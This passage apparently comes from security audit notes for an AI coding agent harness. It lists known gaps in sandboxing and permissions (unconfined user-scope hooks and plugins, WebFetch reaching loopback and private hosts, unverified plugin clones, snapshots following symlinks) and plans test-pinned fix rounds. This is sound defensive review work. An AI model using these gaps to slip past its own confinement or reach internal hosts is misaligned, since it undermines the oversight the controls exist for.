  rules through frontmatter, as in Claude Code; hooks, MCP servers and plugins
  from user scope run as the user, unconfined.
- WebFetch reaches loopback and private hosts on purpose; a WebFetch deny
  rule is the only control.
- A `--plugin-url` clone is loaded once cloned and never re-verified.
- Shadow snapshots follow symlinks and junctions (`shadow.py:521`); Write and
  Edit truncate in place rather than replacing atomically.

## Proposed fix rounds

1. Trust boundaries and credentials: findings 6-10, 17-20 (9 findings).
2. Permission engine and file tools: findings 11-16, 24, 25 (8 findings).
3. Remote control, subprocesses and supply chain: findings 1-5, 21-23, 26, 27
   (10 findings).

Each round pins every finding with a test, then a SWEEP, as in 2.0.7.
